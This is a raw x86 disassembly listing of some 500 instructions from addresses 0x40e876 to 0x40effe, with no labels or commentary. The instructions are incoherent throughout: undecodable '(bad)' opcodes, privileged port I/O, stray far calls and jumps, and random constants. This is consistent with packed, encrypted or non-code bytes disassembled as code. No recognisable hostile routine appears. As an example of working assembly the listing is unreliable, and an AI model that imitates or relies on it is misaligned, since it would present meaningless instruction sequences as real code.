  40e876:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e877:	(bad)  
  40e879:	xchg   ebp,eax
  40e87a:	mov    bh,0x7a
  40e87c:	push   0x4373f7b7
  40e881:	pushw  cs
  40e883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e884:	dec    edi
  40e885:	mov    edi,0xe7af5d7e
  40e88a:	jne    0x40e890
  40e88c:	cmovnp esi,esi
  40e88f:	push   cs
  40e890:	add    cl,BYTE PTR ds:0xfc95a4b9
  40e896:	xor    DWORD PTR gs:[esi+0x44499da8],0xfffffff9
  40e89e:	fucom  st(2)
  40e8a0:	jb     0x40e8d1
  40e8a2:	imul   esp,esp,0x47
  40e8a5:	pop    ecx
  40e8a6:	loop   0x40e8ef
  40e8a8:	dec    ebx
  40e8a9:	loope  0x40e921
  40e8ab:	aaa    
  40e8ac:	adc    eax,0x6cef0caf
  40e8b1:	jg     0x40e91a
  40e8b3:	test   al,0x5a
  40e8b5:	or     dh,bh
  40e8b7:	push   edx
  40e8b8:	sub    DWORD PTR [ebp+0x4296c4e2],0x113c8297
  40e8c2:	je     0x40e8d7
  40e8c4:	add    ecx,DWORD PTR [edx-0x3fdf58fa]
  40e8ca:	shr    BYTE PTR [edi+0x70a15006],1
  40e8d0:	mov    ah,0x5
  40e8d2:	imul   edi,DWORD PTR [ebx-0x214c2213],0xffffffc1
  40e8d9:	pop    edx
  40e8da:	out    dx,eax
  40e8db:	das    
  40e8dc:	test   al,0x64
  40e8de:	adc    edx,DWORD PTR [esi+0x8]
  40e8e1:	sbb    ah,bh
  40e8e3:	xor    BYTE PTR [ecx+0x7b],0xcd
  40e8e7:	bound  ecx,QWORD PTR [ebp+edx*1+0x3e9c040]
  40e8ee:	sub    al,0x17
  40e8f0:	ja     0x40e87e
  40e8f2:	xor    DWORD PTR [ebp+eax*8-0x4f],edi
  40e8f6:	xchg   ebp,eax
  40e8f7:	shl    DWORD PTR [eax-0x49],1
  40e8fa:	sbb    bl,cl
  40e8fc:	inc    esp
  40e8fd:	sti    
  40e8fe:	fwait
  40e8ff:	push   eax
  40e900:	xor    al,0xb5
  40e902:	or     esp,esi
  40e904:	xchg   esi,eax
  40e905:	inc    ecx
  40e906:	pop    eax
  40e907:	mov    ebp,0x23eede17
  40e90c:	sbb    BYTE PTR [esi+0x19],bl
  40e90f:	or     ebx,0x574a3f5d
  40e915:	jae    0x40e8e8
  40e917:	sti    
  40e918:	test   al,0x56
  40e91a:	mov    bl,0xd3
  40e91c:	test   eax,0x3deb361e
  40e921:	gs test eax,0xf4064ea6
  40e927:	lods   eax,DWORD PTR ds:[esi]
  40e928:	adc    DWORD PTR [edi],eax
  40e92a:	mov    esp,0x2073b077
  40e92f:	in     eax,0xf
  40e931:	mov    cl,BYTE PTR [esi-0x45]
  40e934:	mov    bl,BYTE PTR [esi+0x23]
  40e937:	call   0x8f21:0xabb161bb
  40e93e:	push   edx
  40e93f:	mov    cl,0x3a
  40e941:	mov    bl,0xfe
  40e943:	int3   
  40e944:	sar    bl,1
  40e946:	cmc    
  40e947:	adc    DWORD PTR [ecx],ebp
  40e949:	loop   0x40e9bb
  40e94b:	push   cs
  40e94c:	hlt    
  40e94d:	fidiv  WORD PTR [ebx-0x25]
  40e950:	adc    ch,BYTE PTR [edi-0x6e]
  40e953:	repnz or DWORD PTR [edi],0x52d687a1
  40e95a:	std    
  40e95b:	xchg   DWORD PTR [edx+0x39e16744],ebp
  40e961:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e962:	fidivr DWORD PTR [edx+0xf663400]
  40e968:	pop    eax
  40e969:	out    0x2b,eax
  40e96b:	push   ss
  40e96c:	pop    ds
  40e96d:	jnp    0x40e9b2
  40e96f:	xor    bl,BYTE PTR [ebp-0x1e03da86]
  40e975:	iret   
  40e976:	or     BYTE PTR [ebx],0x2b
  40e979:	std    
  40e97a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e97b:	xor    BYTE PTR [edi],ch
  40e97d:	xor    bh,0x1
  40e980:	loopne 0x40e97c
  40e982:	inc    DWORD PTR [edi]
  40e984:	xchg   ecx,eax
  40e985:	mul    BYTE PTR [edi]
  40e987:	(bad)  
  40e989:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e98a:	sub    BYTE PTR [edx-0x1e77bb4a],cl
  40e990:	in     eax,0x2b
  40e992:	mov    dl,0xbd
  40e994:	sub    eax,0x307d51b4
  40e999:	jg     0x40e9bf
  40e99b:	ret    0xfdf7
  40e99e:	out    0xf7,al
  40e9a0:	sbb    al,0xaf
  40e9a2:	aam    0x7c
  40e9a4:	fstp   TBYTE PTR [esi+0x20]
  40e9a7:	or     DWORD PTR [eax+0x51],ebx
  40e9aa:	std    
  40e9ab:	psubsw mm0,QWORD PTR [edi-0x41766540]
  40e9b2:	push   esp
  40e9b3:	dec    esp
  40e9b4:	jle    0x40e9f9
  40e9b6:	mov    al,0x8d
  40e9b8:	in     al,dx
  40e9b9:	and    DWORD PTR [ebp+eax*8-0x285caf0c],ecx
  40e9c0:	adc    ebp,edx
  40e9c2:	fiadd  DWORD PTR [edx+0x77991cdd]
  40e9c8:	cmp    edx,DWORD PTR [ebp-0xfaabf35]
  40e9ce:	sar    BYTE PTR [ebx+ebp*2+0x54],1
  40e9d2:	or     BYTE PTR [di+0x58],0x84
  40e9d7:	ret    
  40e9d8:	xchg   esi,eax
  40e9d9:	shl    ch,1
  40e9db:	mov    ebp,0x33a6b90
  40e9e0:	push   ebx
  40e9e1:	and    eax,0x3c6fc601
  40e9e6:	cs jb  0x40ea37
  40e9e9:	xor    DWORD PTR [ebx+0x3118efbc],edi
  40e9ef:	sub    al,0x35
  40e9f1:	jmp    0x40e9ca
  40e9f3:	mov    esi,0xe9cf19b6
  40e9f8:	jne    0x40ea35
  40e9fa:	and    eax,0xc3db7d57
  40e9ff:	cs ins DWORD PTR es:[edi],dx
  40ea01:	lods   al,BYTE PTR ds:[esi]
  40ea02:	sti    
  40ea03:	add    edi,0xffffffc2
  40ea06:	mov    dl,0x3a
  40ea08:	or     eax,0xa38f9578
  40ea0d:	mov    ecx,0xbd5a6619
  40ea12:	jge    0x40ea32
  40ea14:	push   ss
  40ea15:	mov    al,BYTE PTR [ebp+0x2b039392]
  40ea1b:	fimul  WORD PTR [esi+edi*8+0x57]
  40ea1f:	imul   esi,ebx,0x9da1e18a
  40ea25:	push   ebp
  40ea26:	int    0xd3
  40ea28:	mov    dl,0x44
  40ea2a:	cmp    ah,BYTE PTR [edx+ebx*2+0x52771499]
  40ea31:	mov    cl,0x4e
  40ea33:	out    dx,al
  40ea34:	fst    QWORD PTR [ebx-0x5d478f72]
  40ea3a:	imul   esp,DWORD PTR [ebx+0x26],0xffffffae
  40ea3e:	(bad)  
  40ea3f:	mov    edi,0x57381de4
  40ea44:	retf   0xef9
  40ea47:	jg     0x40e9e4
  40ea49:	mov    esi,0x44853aa3
  40ea4e:	inc    edi
  40ea4f:	and    ch,BYTE PTR [ecx+0x59]
  40ea52:	pop    ecx
  40ea53:	call   0xe549:0xd1b0c27c
  40ea5a:	adc    ecx,DWORD PTR [edx]
  40ea5c:	inc    ebx
  40ea5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea5e:	retf   0xc4e0
  40ea61:	daa    
  40ea62:	push   esi
  40ea63:	push   ds
  40ea64:	dec    edx
  40ea65:	popf   
  40ea66:	and    al,0xf5
  40ea68:	pop    ebx
  40ea69:	pop    eax
  40ea6a:	mov    ebp,0x57fcac17
  40ea6f:	fimul  DWORD PTR [ebx-0x77]
  40ea72:	(bad)
  40ea76:	mov    edx,DWORD PTR [esi]
  40ea78:	jno    0x40eaf6
  40ea7a:	adc    eax,DWORD PTR [ebx]
  40ea7c:	clc    
  40ea7d:	mov    edx,0x1e47e83b
  40ea82:	push   edi
  40ea83:	and    ebx,DWORD PTR [eax+0x50]
  40ea86:	mov    ds:0xe7f9ab77,eax
  40ea8b:	or     BYTE PTR [esi+0x2b89756d],0xa2
  40ea92:	mov    ecx,0xbcbc4402
  40ea97:	sti    
  40ea98:	in     eax,0x8e
  40ea9a:	gs xchg ecx,eax
  40ea9c:	ret    
  40ea9d:	push   ds
  40ea9e:	fldenv [esp+edi*2]
  40eaa1:	sbb    cl,BYTE PTR [eax+0x541baea2]
  40eaa7:	jae    0x40eaeb
  40eaa9:	jp     0x40eb00
  40eaab:	sbb    al,ch
  40eaad:	push   eax
  40eaae:	jb     0x40eaf0
  40eab0:	add    DWORD PTR [ecx],esp
  40eab2:	push   esi
  40eab3:	sbb    edx,DWORD PTR [ecx]
  40eab5:	mov    ebp,0x2a8abe4a
  40eaba:	xchg   ebx,eax
  40eabb:	adc    BYTE PTR [edi-0x47],bh
  40eabe:	mov    esp,0xc7d3f7bc
  40eac3:	in     eax,dx
  40eac4:	push   esi
  40eac5:	adc    dl,BYTE PTR [esi]
  40eac7:	sub    ch,BYTE PTR [esi]
  40eac9:	aas    
  40eaca:	inc    esi
  40eacb:	push   ds
  40eacc:	push   0x21
  40eace:	add    bl,ch
  40ead0:	fwait
  40ead1:	loop   0x40eb1a
  40ead3:	push   eax
  40ead4:	sbb    edi,DWORD PTR [esi-0xe43eb24]
  40eada:	in     eax,0x21
  40eadc:	call   0x8162c51b
  40eae1:	mov    ah,0x6e
  40eae3:	add    al,0x3c
  40eae5:	sbb    esp,esp
  40eae7:	in     eax,dx
  40eae8:	and    edx,esp
  40eaea:	adc    DWORD PTR [eax-0x5c6778cf],0x24c95319
  40eaf4:	dec    esi
  40eaf5:	or     esi,DWORD PTR [edx+esi*8+0x16]
  40eaf9:	or     bl,al
  40eafb:	dec    ebp
  40eafc:	mov    bl,0xe9
  40eafe:	sbb    eax,0xac796405
  40eb03:	cmp    eax,0x96de475b
  40eb08:	and    cl,al
  40eb0a:	es lock jle 0x40ea9d
  40eb0e:	mov    ebp,0x3f3e890b
  40eb13:	rcl    BYTE PTR [esi-0x77f44420],cl
  40eb19:	es lock daa 
  40eb1c:	mov    ebx,DWORD PTR es:[edx+0x2c]
  40eb20:	dec    edx
  40eb21:	nop
  40eb22:	ret    
  40eb23:	mov    esp,0xffafc44f
  40eb28:	sub    al,0xf1
  40eb2a:	add    al,BYTE PTR [esi-0x5c]
  40eb2d:	out    dx,eax
  40eb2e:	mov    esi,0x8d254a8e
  40eb33:	pop    es
  40eb34:	shl    dh,0xac
  40eb37:	sbb    al,0x79
  40eb39:	loope  0x40eaf7
  40eb3b:	xor    BYTE PTR [edx],0x49
  40eb3e:	jb     0x40eaea
  40eb40:	jne    0x40eb59
  40eb42:	jno    0x40eb34
  40eb44:	ins    DWORD PTR es:[edi],dx
  40eb45:	mov    ebx,0x4a3c2dc7
  40eb4a:	mov    ah,0x2f
  40eb4c:	sub    BYTE PTR [ecx+0x1d],cl
  40eb4f:	in     eax,0xde
  40eb51:	jb     0x40ead3
  40eb53:	and    esp,DWORD PTR [edx-0x54]
  40eb56:	adc    DWORD PTR [ecx-0x7b6fa8f],0xab5a01b8
  40eb60:	jl     0x40eae6
  40eb62:	fsubr  DWORD PTR [ebx-0x18]
  40eb65:	inc    esi
  40eb66:	fwait
  40eb67:	mov    bh,0x5c
  40eb69:	retf   
  40eb6a:	jo     0x40eb9c
  40eb6c:	jno    0x40eb31
  40eb6e:	jo     0x40eb7b
  40eb70:	(bad)  
  40eb71:	aad    0x40
  40eb73:	cdq    
  40eb74:	addr16 pop edx
  40eb76:	cmc    
  40eb77:	lock sub al,bh
  40eb7a:	jg     0x40eb4f
  40eb7c:	bound  ecx,QWORD PTR [ebx-0x3ca635b0]
  40eb82:	std    
  40eb83:	fist   WORD PTR [edi+0x14]
  40eb86:	lods   eax,DWORD PTR ds:[si]
  40eb88:	loop   0x40eb6f
  40eb8a:	jae    0x40ebc7
  40eb8c:	inc    esp
  40eb8d:	or     ah,BYTE PTR [eax+edx*1]
  40eb90:	cmp    BYTE PTR [esi-0x49],bl
  40eb93:	xor    eax,0xd28bb20b
  40eb98:	xchg   esp,eax
  40eb99:	cvtpi2ps xmm3,QWORD PTR [ebx]
  40eb9c:	out    0xc4,al
  40eb9e:	mov    cl,0x11
  40eba0:	shr    ch,cl
  40eba2:	adc    ebp,ebp
  40eba4:	jle    0x40eb76
  40eba6:	fcmovbe st,st(0)
  40eba8:	dec    bx
  40ebaa:	push   esi
  40ebab:	sbb    BYTE PTR [esi],ch
  40ebad:	mov    eax,0xf6f5416c
  40ebb2:	sahf   
  40ebb3:	in     al,dx
  40ebb4:	stos   DWORD PTR es:[edi],eax
  40ebb5:	sbb    al,0xb8
  40ebb7:	push   edi
  40ebb8:	out    dx,al
  40ebb9:	frstor [ebx]
  40ebbb:	and    al,al
  40ebbd:	retf   0xf4a4
  40ebc0:	sahf   
  40ebc1:	mov    ah,0x21
  40ebc3:	(bad)  [ebp+0x57c5ede8]
  40ebc9:	int3   
  40ebca:	jns    0x40eb6e
  40ebcc:	mov    ebp,DWORD PTR [ebp-0x2c0fc563]
  40ebd2:	and    dl,dl
  40ebd4:	jbe    0x40ec53
  40ebd6:	shl    BYTE PTR [eax-0x52d56865],0x58
  40ebdd:	cld    
  40ebde:	xor    esi,DWORD PTR [ecx+edi*1]
  40ebe1:	loop   0x40ebd8
  40ebe3:	sti    
  40ebe4:	inc    edx
  40ebe5:	rol    BYTE PTR [esi+0x80735e6],1
  40ebeb:	sbb    eax,0x65a6c84b
  40ebf0:	call   0x4dda:0x76e15de6
  40ebf7:	dec    ecx
  40ebf8:	idiv   BYTE PTR [esi-0x11d2a881]
  40ebfe:	scas   eax,DWORD PTR es:[edi]
  40ebff:	xchg   DWORD PTR [ecx-0x60edba98],edi
  40ec05:	mov    ebx,0x9c4cdf3c
  40ec0a:	ret    
  40ec0b:	xchg   BYTE PTR [esi+0x28eae0a],al
  40ec11:	jno    0x40ec67
  40ec13:	pop    ds
  40ec14:	sbb    eax,0x11d23d7f
  40ec19:	pop    ds
  40ec1a:	and    al,0x4
  40ec1c:	jmp    0x40ec83
  40ec1e:	xchg   esp,eax
  40ec1f:	pop    ecx
  40ec20:	retf   0x258
  40ec23:	fnstenv [ebx]
  40ec25:	nop
  40ec26:	mov    al,0xc6
  40ec28:	jmp    0xdd34:0xbd415fb1
  40ec2f:	test   BYTE PTR [ebp+0x1f6f58b7],bl
  40ec35:	imul   edx,eax,0xffffff85
  40ec38:	lds    ebx,FWORD PTR [edx]
  40ec3a:	dec    esi
  40ec3b:	fldenv [ecx]
  40ec3d:	repz int3 
  40ec3f:	(bad)  
  40ec40:	pop    ebp
  40ec41:	inc    ecx
  40ec42:	aad    0xfc
  40ec44:	sub    ecx,DWORD PTR [eax]
  40ec46:	std    
  40ec47:	mov    edx,0x44b423a1
  40ec4c:	sbb    al,0x54
  40ec4e:	adc    al,0x3d
  40ec50:	and    al,0xae
  40ec52:	fsub   DWORD PTR ds:0x7f57f87e
  40ec58:	in     eax,dx
  40ec59:	push   eax
  40ec5a:	popf   
  40ec5b:	addr16 dec edx
  40ec5d:	mov    edi,0xfa1fb951
  40ec62:	jb     0x40ebe6
  40ec64:	outs   dx,BYTE PTR ds:[esi]
  40ec65:	retf   
  40ec66:	lock mov dl,0x5a
  40ec69:	test   DWORD PTR [ebp+0x16927ad2],ebp
  40ec6f:	add    BYTE PTR [eax],cl
  40ec71:	enter  0x3c15,0x14
  40ec75:	adc    DWORD PTR [eax+ebx*4],0x16
  40ec79:	and    BYTE PTR [esi-0x59],bh
  40ec7c:	cmp    DWORD PTR [edi-0x3dd9d0a6],esi
  40ec82:	xor    BYTE PTR [eax-0x7f968052],dh
  40ec88:	nop    DWORD PTR [ecx+0x7bdda20]
  40ec8f:	mov    al,0xab
  40ec91:	dec    ecx
  40ec92:	(bad)  
  40ec93:	(bad)  [ebx-0x57]
  40ec96:	(bad)  
  40ec97:	clc    
  40ec98:	push   ss
  40ec99:	dec    ebp
  40ec9a:	shl    BYTE PTR [eax+0x35],1
  40ec9d:	or     DWORD PTR [edi-0x6f8ab412],edi
  40eca3:	cmp    ecx,DWORD PTR [esi-0x6a]
  40eca6:	xchg   BYTE PTR [ebx+0x79d7d903],dh
  40ecac:	mov    ds:0x2bd6b2f1,al
  40ecb1:	mov    ecx,0xff36b6c5
  40ecb6:	aas    
  40ecb7:	lds    ebp,FWORD PTR [ebx-0x3]
  40ecba:	and    eax,0x9b92f9ad
  40ecbf:	in     eax,0xfe
  40ecc1:	xor    dl,BYTE PTR [edi-0x22897457]
  40ecc7:	cmp    al,0x34
  40ecc9:	adc    bh,BYTE PTR [eax+0x26]
  40eccc:	cmp    DWORD PTR [edi+eiz*4],0x72
  40ecd0:	jne    0x40ed3e
  40ecd2:	es mov dh,0x29
  40ecd5:	xor    eax,0x678f3900
  40ecda:	inc    edi
  40ecdb:	fmul   DWORD PTR [esi-0x43b2a672]
  40ece1:	push   ecx
  40ece2:	shl    BYTE PTR [ebp+0x21],cl
  40ece5:	les    esp,FWORD PTR [edx*4-0x4addf01c]
  40ecec:	mov    ecx,0xbea61e4e
  40ecf1:	dec    edi
  40ecf2:	ins    WORD PTR es:[edi],dx
  40ecf4:	mov    dh,0x2e
  40ecf6:	add    eax,esi
  40ecf8:	mov    ecx,0xc392b89
  40ecfd:	scas   al,BYTE PTR es:[edi]
  40ecfe:	pusha  
  40ecff:	inc    edx
  40ed00:	addr16 jmp 0xf4f9:0xc96cd2e5
  40ed08:	jle    0x40eca8
  40ed0a:	jl     0x40ed6e
  40ed0c:	adc    eax,0x29578a33
  40ed11:	adc    ecx,DWORD PTR [ecx+0xa]
  40ed14:	call   0x6787:0x32c4bf92
  40ed1b:	addr16 push 0xffffffde
  40ed1e:	mov    eax,ds:0x64cebdd6
  40ed23:	aam    0xae
  40ed25:	loope  0x40ecc0
  40ed27:	inc    esi
  40ed28:	push   ebp
  40ed29:	and    ecx,DWORD PTR [ebp-0x3b]
  40ed2c:	sub    ebx,DWORD PTR ds:0xf212e20e
  40ed32:	cmp    ebp,DWORD PTR [edx-0x6]
  40ed35:	inc    ebp
  40ed36:	idiv   edi
  40ed38:	cs push ss
  40ed3a:	std    
  40ed3b:	scas   al,BYTE PTR es:[edi]
  40ed3c:	lahf   
  40ed3d:	xchg   edi,eax
  40ed3e:	add    ecx,esp
  40ed40:	push   ss
  40ed41:	div    BYTE PTR [ebx+0x6318ee45]
  40ed47:	and    eax,0x42388567
  40ed4c:	jno    0x40ed2e
  40ed4e:	and    ebp,DWORD PTR [ebx+esi*8-0xd]
  40ed52:	xchg   edi,eax
  40ed53:	sbb    dl,bh
  40ed55:	call   0xf6e4:0x2a48462d
  40ed5c:	leave  
  40ed5d:	or     al,0xa1
  40ed5f:	aad    0x4e
  40ed61:	jg     0x40ede0
  40ed63:	stc    
  40ed64:	add    al,0xdd
  40ed66:	dec    ecx
  40ed67:	pop    esp
  40ed68:	leave  
  40ed69:	add    bh,BYTE PTR [edx-0x5e]
  40ed6c:	inc    edi
  40ed6d:	mov    ds:0x5bea2477,eax
  40ed72:	push   ss
  40ed73:	in     eax,0xd8
  40ed75:	xor    ebp,eax
  40ed77:	xor    bh,BYTE PTR [edx-0x1c]
  40ed7a:	das    
  40ed7b:	mov    ebx,0x8bfaf77f
  40ed80:	pop    ebx
  40ed81:	pop    esp
  40ed82:	cmp    DWORD PTR [esi],esi
  40ed84:	scas   al,BYTE PTR es:[edi]
  40ed85:	inc    edx
  40ed86:	sbb    DWORD PTR [edi],ecx
  40ed88:	xor    al,0x3a
  40ed8a:	adc    al,0xd7
  40ed8c:	gs or  eax,eax
  40ed8f:	stc    
  40ed90:	and    al,0x33
  40ed92:	jmp    0xac0f4202
  40ed97:	sbb    BYTE PTR [ecx+0x6a],cl
  40ed9a:	call   0xc23f90e1
  40ed9f:	and    BYTE PTR [esi+0x57],dh
  40eda2:	pop    eax
  40eda3:	outs   dx,DWORD PTR ds:[esi]
  40eda4:	sar    BYTE PTR [edx],0xfa
  40eda7:	outs   dx,BYTE PTR ds:[esi]
  40eda8:	jg     0x40ed43
  40edaa:	mov    edx,0xb639eeb8
  40edaf:	and    esi,edx
  40edb1:	stc    
  40edb2:	xor    DWORD PTR [edi+edi*2+0x29],0x3698536
  40edba:	sbb    DWORD PTR [esi],eax
  40edbc:	xor    al,0xec
  40edbe:	xchg   ecx,eax
  40edbf:	add    eax,0x8976c316
  40edc4:	lods   eax,DWORD PTR ds:[esi]
  40edc5:	dec    ebx
  40edc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edc7:	sbb    eax,DWORD PTR [ebx-0x519a6e20]
  40edcd:	ins    DWORD PTR es:[edi],dx
  40edce:	(bad)  
  40edcf:	dec    ebx
  40edd0:	and    cl,cl
  40edd2:	bound  eax,QWORD PTR [eax+edi*2+0x6a]
  40edd6:	pop    ecx
  40edd7:	sub    eax,0xcb0750b6
  40eddc:	jb     0x40edcf
  40edde:	daa    
  40eddf:	add    DWORD PTR [ebx],0x949baa78
  40ede5:	or     BYTE PTR [ecx],bh
  40ede7:	mov    ds:0xb6f3f8fc,al
  40edec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eded:	ret    0xa9e6
  40edf0:	push   esi
  40edf1:	call   0x843c:0x527d1461
  40edf8:	loopne 0x40ee0a
  40edfa:	xchg   ebx,eax
  40edfb:	aam    0x2d
  40edfd:	add    al,0xad
  40edff:	ret    
  40ee00:	sbb    BYTE PTR [edi-0x51],al
  40ee03:	loope  0x40ed88
  40ee05:	ret    0xadd7
  40ee08:	nop
  40ee09:	or     al,0xa7
  40ee0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee0c:	mov    dl,0x3e
  40ee0e:	shr    BYTE PTR gs:[edi+edx*8],0x8d
  40ee13:	xchg   bl,dh
  40ee15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee16:	jecxz  0x40ee26
  40ee18:	(bad)  
  40ee19:	daa    
  40ee1a:	sbb    edx,DWORD PTR [esi+edi*2+0x65]
  40ee1e:	lds    esp,FWORD PTR [eax+0x4d]
  40ee21:	mov    DWORD PTR [edx],ecx
  40ee23:	xor    esi,DWORD PTR [ebp-0x19a0a67f]
  40ee29:	es pop ebp
  40ee2b:	inc    esi
  40ee2c:	add    al,BYTE PTR [ecx+0x7b83ad75]
  40ee32:	repz fs sbb eax,0xa4298d9e
  40ee39:	sbb    cl,cl
  40ee3b:	adc    edi,edx
  40ee3d:	or     eax,0x39798fcd
  40ee42:	fidiv  DWORD PTR ds:0x76395555
  40ee48:	scas   eax,DWORD PTR es:[edi]
  40ee49:	xchg   edx,eax
  40ee4a:	call   0x7dda7f33
  40ee4f:	mov    BYTE PTR [esi+0x41],al
  40ee52:	fidivr WORD PTR [edx-0x256b5cb2]
  40ee58:	pushf  
  40ee59:	push   esi
  40ee5a:	push   0x5ad6fb77
  40ee5f:	(bad)  [eax]
  40ee61:	xor    al,0x7b
  40ee63:	push   eax
  40ee64:	add    esi,esp
  40ee66:	(bad)  
  40ee67:	ins    BYTE PTR es:[edi],dx
  40ee68:	or     edi,DWORD PTR [eax-0x37]
  40ee6b:	push   ebp
  40ee6c:	dec    edx
  40ee6d:	add    DWORD PTR [eax+0x33],ebx
  40ee70:	pop    esp
  40ee71:	psubq  mm4,QWORD PTR [edi+0x7455c9f]
  40ee78:	xchg   esp,eax
  40ee79:	call   FWORD PTR [esi-0x2e]
  40ee7c:	mov    eax,ds:0xa3c1255f
  40ee81:	outs   dx,DWORD PTR ds:[esi]
  40ee82:	push   es
  40ee83:	jno    0x40eec3
  40ee85:	inc    esp
  40ee86:	cmp    DWORD PTR [ebp+0x68],edi
  40ee89:	fmul   QWORD PTR [ebx]
  40ee8b:	pop    DWORD PTR [esi-0x7c]
  40ee8e:	and    eax,0xa4a10f71
  40ee93:	sub    BYTE PTR ds:0xaebc5866,0x4
  40ee9a:	and    ah,BYTE PTR [edx+0x197fb7da]
  40eea0:	pop    edi
  40eea1:	push   eax
  40eea2:	aam    0xa3
  40eea4:	jle    0x40ee51
  40eea6:	pusha  
  40eea7:	lahf   
  40eea8:	jl     0x40ee6e
  40eeaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eeab:	sbb    al,0x67
  40eead:	mov    cl,0xe
  40eeaf:	mov    al,ds:0x236346b9
  40eeb4:	push   esp
  40eeb5:	fcomp  DWORD PTR [ecx+0xb8c4cc5]
  40eebb:	xchg   esp,eax
  40eebc:	sub    DWORD PTR [edx+0x63131ce9],ebp
  40eec2:	adc    al,0x72
  40eec4:	std    
  40eec5:	in     eax,0xec
  40eec7:	arpl   WORD PTR fs:[eax-0x4ac3f49c],si
  40eece:	push   es
  40eecf:	addr16 ret 0xcaca
  40eed3:	outs   dx,BYTE PTR ds:[esi]
  40eed4:	outs   dx,BYTE PTR ds:[esi]
  40eed5:	push   eax
  40eed6:	test   eax,0x236af5b
  40eedb:	dec    ebp
  40eedc:	sti    
  40eedd:	jg     0x40ee63
  40eedf:	mov    edx,0x47e0cc28
  40eee4:	int    0x74
  40eee6:	push   0xffffffd9
  40eee8:	inc    ebx
  40eee9:	adc    eax,0xd8cb2c9b
  40eeee:	mov    dh,0xbd
  40eef0:	mov    esp,DWORD PTR [ebx-0x72eca33c]
  40eef6:	fs retf 
  40eef8:	push   0xfffffff6
  40eefa:	push   ecx
  40eefb:	xchg   edx,eax
  40eefc:	xor    ah,BYTE PTR [edi-0x15bbe625]
  40ef02:	bound  ecx,QWORD PTR [esi+0x448a8be0]
  40ef08:	xor    ch,cl
  40ef0a:	popf   
  40ef0b:	outs   dx,BYTE PTR ds:[esi]
  40ef0c:	out    0x5d,eax
  40ef0e:	cmc    
  40ef0f:	pop    ecx
  40ef10:	push   edx
  40ef11:	fild   WORD PTR [esi-0x26c5d413]
  40ef17:	sbb    esi,ecx
  40ef19:	xchg   DWORD PTR [edx+ebx*4-0x4d],ebp
  40ef1d:	jl     0x40ef22
  40ef1f:	les    ecx,FWORD PTR [ecx+0x309b48cc]
  40ef25:	pop    eax
  40ef26:	maskmovq mm5,(bad)
  40ef27:	imul   DWORD PTR [esi+0x40]
  40ef2a:	or     DWORD PTR [di-0x4f],0x78ba9bc4
  40ef32:	add    cl,0xd8
  40ef35:	ret    
  40ef36:	mov    ds:0xb067e9b,eax
  40ef3b:	and    eax,DWORD PTR [eax+0xf]
  40ef3e:	mov    ds:0x722a6183,al
  40ef43:	mov    ch,0xe5
  40ef45:	lods   eax,DWORD PTR ds:[esi]
  40ef46:	ret    
  40ef47:	jne    0x40ef74
  40ef49:	or     bh,BYTE PTR [ecx-0x383b199c]
  40ef4f:	aam    0x43
  40ef51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef52:	leave  
  40ef53:	(bad)  
  40ef55:	mov    eax,ds:0x6d928951
  40ef5a:	xchg   esp,eax
  40ef5b:	sub    dl,BYTE PTR [bp+si]
  40ef5e:	mov    eax,ds:0xcacdfeb9
  40ef63:	js     0x40ef11
  40ef65:	cmp    eax,0x47dc7b73
  40ef6a:	lods   eax,DWORD PTR ds:[esi]
  40ef6b:	xor    edi,DWORD PTR [ecx]
  40ef6d:	mov    edi,0x457a6d76
  40ef72:	inc    ebx
  40ef73:	pop    ecx
  40ef74:	shl    DWORD PTR [esi+esi*8-0x67],0x94
  40ef79:	sub    esp,esi
  40ef7b:	and    eax,0x34ef82cb
  40ef80:	push   ecx
  40ef81:	shl    ecx,cl
  40ef83:	mov    eax,ds:0xaafc2a96
  40ef88:	bound  edi,QWORD PTR [eax-0x15dfe502]
  40ef8e:	hlt    
  40ef8f:	push   esp
  40ef90:	popf   
  40ef91:	and    esi,DWORD PTR [edi]
  40ef93:	push   ebx
  40ef94:	push   edx
  40ef95:	pop    esi
  40ef96:	out    0xb9,al
  40ef98:	push   ss
  40ef99:	add    dh,BYTE PTR [edi+eiz*1-0x7d]
  40ef9d:	xlat   BYTE PTR ds:[ebx]
  40ef9e:	fnstsw WORD PTR [edx-0x3d]
  40efa1:	cwde   
  40efa2:	xor    DWORD PTR [esi],ecx
  40efa4:	sub    ebp,ebp
  40efa6:	mov    eax,ds:0x8f8554
  40efab:	fist   WORD PTR [esi+0x5c]
  40efae:	fdivr  QWORD PTR [ecx+0x11cfbb27]
  40efb4:	add    DWORD PTR [edi+ebp*1],0x48
  40efb8:	cs mov bh,0xd7
  40efbb:	jno    0x40efe1
  40efbd:	out    dx,al
  40efbe:	ret    
  40efbf:	into   
  40efc0:	into   
  40efc1:	jecxz  0x40efba
  40efc3:	jb     0x40f037
  40efc5:	out    dx,al
  40efc6:	int3   
  40efc7:	xor    esp,DWORD PTR [edi]
  40efc9:	inc    edi
  40efca:	xchg   esp,eax
  40efcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40efcc:	in     al,0x2e
  40efce:	and    eax,DWORD PTR [ebx+ebp*1-0x5a0d90f0]
  40efd5:	es push ds
  40efd7:	test   BYTE PTR [eax-0x7c192424],0x79
  40efde:	xor    BYTE PTR [edx+0x7b],0xae
  40efe2:	sbb    dl,BYTE PTR [ebp+0x13065592]
  40efe8:	or     cl,BYTE PTR [edi]
  40efea:	pushf  
  40efeb:	sub    DWORD PTR [ebx],esp
  40efed:	adc    bl,ah
  40efef:	or     esp,ecx
  40eff1:	leave  
  40eff2:	xchg   esi,eax
  40eff3:	jo     0x40f041
  40eff5:	sar    ebx,cl
  40eff7:	cmp    al,0x6a
  40eff9:	icebp  
  40effa:	mov    ch,0x6a
  40effc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40effd:	push   esi
  40effe:	and    edi,DWORD PTR [eax-0x3d9cb161]
